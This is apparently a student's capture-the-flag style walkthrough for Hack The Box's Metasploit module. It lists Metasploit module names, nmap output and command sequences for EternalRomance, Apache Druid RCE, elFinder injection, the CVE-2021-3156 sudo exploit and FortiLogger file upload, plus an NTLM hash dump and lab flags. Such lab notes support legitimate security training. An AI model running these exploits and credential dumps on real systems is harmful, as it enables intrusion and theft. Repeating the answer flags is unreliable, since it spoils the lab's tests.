---
title: CPTS labs - 08 Using the Metasploit Framework
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 08 Using the Metasploit Framework


## [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)

### Introduction to Metasploit

**Which version of Metasploit comes equipped with a GUI interface?**

Results: Metasploit Pro


**What command do you use to interact with the free version of Metasploit?**

Results: msfconsole

### MSF Components

**Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.**

```
msfconsole -q

search EternalRomance
use exploit/windows/smb/ms17_010_psexec

#set options, run, and obtain a meterpreter
shell
type C:/Users/Administrator/Desktop/flag.txt
```

Results: HTB{MSF-W1nD0w5-3xPL01t4t10n}


**Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.**

```
sudo nmap -sC -sV $ip -Pn 
```

```
# From results you have
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
8081/tcp open  http    Jetty 9.4.12.v20180830
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8081/unified-console.html
|_http-server-header: Jetty(9.4.12.v20180830)
8082/tcp open  http    Jetty 9.4.12.v20180830
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.12.v20180830)
8083/tcp open  http    Jetty 9.4.12.v20180830
|_http-server-header: Jetty(9.4.12.v20180830)
|_http-title: Site doesn't have a title.
8888/tcp open  http    Jetty 9.4.12.v20180830
|_http-server-header: Jetty(9.4.12.v20180830)
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8888/unified-console.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
# Now
msfconsole -q
search apache druid
use linux/http/apache_druid_js_rce
# set RHOSTS, LHOST, etc and run it to obtain a meterpreter

shell
pwd
cd ..
cat flag.txt

```

Results: HTB{MSF_Expl01t4t10n}


### MSF Sessions

**The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?**

Results: elFinder


**Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?**

```
msfconsole -q
workspace -a lala
db_nmap -sC -sV $ip
search elfinder
use linux/http/elfinder_archive_cmd_injection
# SET RHOSTS, SET LHOST...
run
getuid
```

Results: www-data



**The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.**

```
# In the previous session, run
sudo -V
```

```
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

After searching in google, we find CVE-2021-3156:

```
search CVE-2021-3156
options
# SET SESSION 2, SET LHOST, SET RHOSTS
run
shell
cat /root/flag.txt
```

Results: HTB{5e55ion5_4r3_sw33t}


Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```
msfconsole -q
db_nmap -sC -sV -p- $ip
```

From response pay attention to port 5000:

```
Nmap: PORT      STATE SERVICE       VERSION
[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds?
[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: |_ssl-date: 2024-09-23T19:38:10+00:00; 0s from scanner time.
[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
[*] Nmap: | Not valid before: 2024-09-22T19:35:32
[*] Nmap: |_Not valid after:  2025-03-24T19:35:32
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   Product_Version: 10.0.17763
[*] Nmap: |_  System_Time: 2024-09-23T19:38:02+00:00
[*] Nmap: 5000/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
[*] Nmap: |_http-title: FortiLogger | Log and Report System
[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-title: Not Found
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: |_http-title: Not Found
[*] Nmap: 49664/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49665/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49666/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49667/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49668/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49669/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49670/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49671/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2024-09-23T19:38:06
[*] Nmap: |_  start_date: N/A
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

After visiting $ip:5000 you can see the Fortilogger service. 

```
search fortilogger
use exploit/windows/http/fortilogger_arbitrary_fileupload
# SET LHOST, RHOSTS...
run 
getuid
```

Results: NT AUTHORITY\SYSTEM
 

Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

```
lsa_dump_sam
```

```
... CUT ...
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
... CUT ...

```

Results: cf3a5525ee9414229e66279623ed5c58